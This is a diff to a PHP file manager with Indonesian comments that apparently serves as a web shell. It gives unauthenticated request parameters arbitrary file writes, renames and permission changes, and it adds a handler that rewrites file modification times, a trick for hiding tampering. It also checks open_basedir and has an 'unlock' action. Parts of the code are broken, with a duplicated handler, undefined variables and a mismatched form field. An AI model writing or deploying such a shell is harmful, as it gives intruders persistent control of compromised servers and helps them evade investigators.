@@ -237,20 +237,43 @@ if (isset($_POST['savefile'], $_POST['filename'])) {
     file_put_contents($_POST['filename'], $_POST['savefile']);
     header("Location: ?path=" . urlencode(dirname($_POST['filename']))); exit;
 }
-if (isset($_POST['ajax_rename']) && isset($_POST['old']) && isset($_POST['new'])) {
+if (isset($_POST['rename'], $_POST['old'], $_POST['new'])) {
     $old = $_POST['old'];
     $new = dirname($old) . DIRECTORY_SEPARATOR . basename($_POST['new']);
     if (file_exists($old)) {
-        if (rename($old, $new)) {
-            echo json_encode(['status' => 'success']);
-        } else {
-            echo json_encode(['status' => 'error', 'message' => 'Rename failed']);
-        }
-    } else {
-        echo json_encode(['status' => 'error', 'message' => 'Original file not found']);
+        @rename($old, $new);
     }
+    header("Location: ?path=" . urlencode(dirname($old)));
     exit;
 }
+
+// Touch/modify time handler (non-AJAX)
+if (isset($_POST['touch'], $_POST['file'], $_POST['time'])) {
+    $file = $_POST['file'];
+    $timeStr = $_POST['time'];
+    $timestamp = strtotime($timeStr);
+    if (file_exists($file) && $timestamp) {
+        @touch($file, $timestamp);
+    }
+    header("Location: ?path=" . urlencode(dirname($file)));
+    exit;
+}
+
+// ⬇️ SISIPAN UNTUK CHMOD (Edit Permissions)
+if (isset($_POST['chmod_file'], $_POST['chmod_val'])) {
+    $target = $_POST['chmod_file'];
+    $perm = $_POST['chmod_val'];
+    if (!preg_match('/^[0-7]{3,4}$/', $perm)) {
+        echo "<div class='text-red-500 p-2'>❌ Invalid permission format: $perm</div>";
+    } else {
+        if (@chmod($target, octdec($perm))) {
+            echo "<div class='text-green-500 p-2'>✅ Permissions updated for <code>" . htmlspecialchars(basename($target)) . "</code> → <code>$perm</code></div>";
+        } else {
+            echo "<div class='text-red-500 p-2'>❌ Failed to chmod <code>" . htmlspecialchars(basename($target)) . "</code></div>";
+        }
+    }
+}
+
 if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     $f = $_GET['edit'];
     $c = htmlspecialchars(file_get_contents($f));
@@ -264,50 +287,27 @@ if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     <a href='?path=" . urlencode(dirname($f)) . "' class='text-red-400 text-xl hover:underline'>Cancel</a>
     </div></form></div></body></html>"; exit;
 }
-if (isset($_GET['del']) && file_exists($_GET['del'])) {
-    $t = $_GET['del'];
 
-    // Fungsi hapus rekursif
-    function deleteRecursive($path) {
-        if (is_dir($path)) {
-            $items = scandir($path);
-            foreach ($items as $item) {
-                if ($item == '.' || $item == '..') continue;
-                $full = $path . DIRECTORY_SEPARATOR . $item;
-                if (is_dir($full)) {
-                    deleteRecursive($full);
-                } else {
-                    unlink($full);
-                }
-            }
-            rmdir($path);
-        } else {
-            unlink($path);
-        }
+if (isset($_POST['rename'], $_POST['old'], $_POST['new'])) {
+    $old = $_POST['old'];
+    $newName = basename($_POST['new']); // hanya nama file
+    $dir = dirname($old);
+    $new = $dir . DIRECTORY_SEPARATOR . $newName;
+
+    if (!file_exists($old)) {
+        echo "<div class='text-red-500 p-2'>❌ File asal tidak ditemukan</div>";
+    } elseif ($newName === basename($old)) {
+        // Nama tidak berubah
+        header("Location: ?path=" . urlencode($dir));
+        exit;
+    } elseif (file_exists($new)) {
+        echo "<div class='text-red-500 p-2'>❌ Nama baru sudah ada</div>";
+    } elseif (@rename($old, $new)) {
+        header("Location: ?path=" . urlencode($dir));
+        exit;
+    } else {
+        echo "<div class='text-red-500 p-2'>❌ Gagal mengganti nama</div>";
     }
-
-    deleteRecursive($t);
-    header("Location: ?path=" . urlencode(dirname($t)));
-    exit;
-}
-if (isset($_GET['download']) && is_file($_GET['download'])) {
-    $file = $_GET['download'];
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($file));
-    readfile($file);
-    exit;
-}
-if (isset($_POST['rename_from'], $_POST['rename_to'])) {
-    $from = $_POST['rename_from'];
-    $to = dirname($from) . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
-    rename($from, $to);
-    header("Location: ?path=" . urlencode(dirname($from)));
-    exit;
 }
 if (isset($_POST['target'], $_POST['perm'])) {
     chmod($_POST['target'], octdec($_POST['perm']));
@@ -450,7 +450,40 @@ $open_basedir = ini_get('open_basedir') ?: 'NONE';
       </div>
       <div><span class="text-blue-400 font-bold">Open_basedir:</span> <?= $open_basedir ?></div>
     </div>
-	
+	<?php
+foreach ($files as $file) {
+    $filepath = $path . '/' . $file;
+    $perms = substr(sprintf('%o', fileperms($filepath)), -4);
+    // ... info size, owner, etc
+
+    echo "<tr>";
+    echo "<td>$file</td>"; // Name
+    echo "<td>$size</td>"; // Size
+    echo "<td class='p-2 text-center font-mono text-xs'>
+  <form method='POST' class='inline'>
+    <input type='hidden' name='touch' value='1'>
+    <input type='hidden' name='file' value='" . htmlspecialchars($full) . "'>
+    <input type='text' name='time' value='" . $mtime . "' size='19' maxlength='19'
+      class='bg-gray-900 border border-gray-600 rounded text-center text-cyan-300 w-44'
+      onchange='this.form.submit()' title='Format: YYYY-MM-DD HH:MM:SS'>
+  </form>
+</td>"; // Modify
+    echo "<td>$owner/$group</td>"; // Owner/Group
+
+    // ⬇️ Disimpan di sini (kolom "Permissions")
+    echo "<td class='p-2 text-center font-mono text-xs'>
+      <form method='POST' class='inline'>
+        <input type='hidden' name='chmod_file' value=\"" . htmlspecialchars($filepath) . "\">
+        <input type='text' name='chmod_val' value=\"$perms\" maxlength='4' size='4\"
+               class='bg-gray-900 border border-gray-600 rounded text-center w-16 text-white'>
+        <button type='submit' class='ml-1 text-blue-400 hover:underline'>Set</button>
+      </form>
+    </td>";
+
+    echo "<td>Actions</td>"; // Actions
+    echo "</tr>";
+}
+?>
     <!-- Status open_basedir -->
     <?php
     function is_open_basedir_restricted() {
@@ -645,9 +678,13 @@ $open_basedir = ini_get('open_basedir') ?: 'NONE';
         $permStr .= $filePerms & 0x0002 ? 'w' : '-';
         $permStr .= $filePerms & 0x0001 ? 'x' : '-';
 
-        $nameDisplay = $isDir
-  ? "<a href='?path=" . urlencode($full) . "' class='text-yellow-400 hover:underline rename' data-path='" . htmlspecialchars($full) . "'>| $f |</a>"
-  : "<span class='text-white rename' data-path='" . htmlspecialchars($full) . "'>| $f</span>";
+        $nameDisplay = "<form method='POST' class='inline'>
+  <input type='hidden' name='rename' value='1'>
+  <input type='hidden' name='old' value='" . htmlspecialchars($full) . "'>
+  <input type='text' name='new' value='" . htmlspecialchars($f) . "'
+         class='bg-gray-900 border border-gray-600 rounded text-white text-center w-40'
+         onchange='this.form.submit()'>
+</form>";
 
         $actions = [];
         if (!$isDir) {
@@ -659,13 +696,29 @@ $open_basedir = ini_get('open_basedir') ?: 'NONE';
         $actions[] = "<a href='?unlock=" . urlencode($full) . "' class='text-white'>U</a>";
 
         echo "<tr class='border-t border-gray-700'>
-          <td class='p-2'>$nameDisplay</td>
-          <td class='p-2 text-center'>$size</td>
-          <td class='p-2 text-center text-cyan-300'>$mtime</td>
-          <td class='p-2 text-center text-blue-300'>$owner/$group</td>
-          <td class='p-2 text-center'><span class='text-green-400'>$perm</span> &raquo; <span class='text-lime-300'>$permStr</span></td>
-          <td class='p-2 text-center space-x-2'>" . implode(' ', $actions) . "</td>
-        </tr>";
+  <td class='p-2'>$nameDisplay</td>
+  <td class='p-2 text-center'>$size</td>
+  <td class='p-2 text-center font-mono text-xs'>
+  <form method='POST' class='inline'>
+    <input type='hidden' name='ajax_touch' value='1'>
+    <input type='hidden' name='file' value='" . htmlspecialchars($full) . "'>
+    <input type='text' name='time' value='" . $mtime . "' size='19' maxlength='19'
+      class='bg-gray-900 border border-gray-600 rounded text-center text-cyan-300 w-44'
+      onchange='this.form.submit()' title='Format: YYYY-MM-DD HH:MM:SS'>
+  </form>
+</td>
+  <td class='p-2 text-center text-blue-300'>$owner/$group</td>
+  <td class='p-2 text-center font-mono text-xs'>
+    <form method='POST' class='inline'>
+      <input type='hidden' name='chmod_file' value='" . htmlspecialchars($full) . "'>
+      <input type='text' name='chmod_val' value='" . $perm . "' maxlength='4'
+        class='bg-gray-900 border border-gray-600 rounded text-center w-16 text-white'
+        onchange='this.form.submit()' title='Tekan Enter untuk ubah permission'>
+      <div class='text-lime-300 text-xs mt-1'>" . $permStr . "</div>
+    </form>
+  </td>
+  <td class='p-2 text-center space-x-2'>" . implode(' ', $actions) . "</td>
+</tr>";
     }
     ?>
   </tbody>
@@ -692,6 +745,25 @@ document.querySelectorAll('td .rename').forEach(el => {
       });
     }
   });
+});
+</script>
+<script>
+// Simpan posisi scroll sebelum submit form
+document.querySelectorAll('form.inline input').forEach(input => {
+  input.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      sessionStorage.setItem('scrollTop', window.scrollY);
+    }
+  });
+});
+
+// Kembalikan posisi scroll setelah halaman reload
+window.addEventListener('load', () => {
+  const scrollTop = sessionStorage.getItem('scrollTop');
+  if (scrollTop !== null) {
+    window.scrollTo(0, parseInt(scrollTop));
+    sessionStorage.removeItem('scrollTop');
+  }
 });
 </script>
 </body>
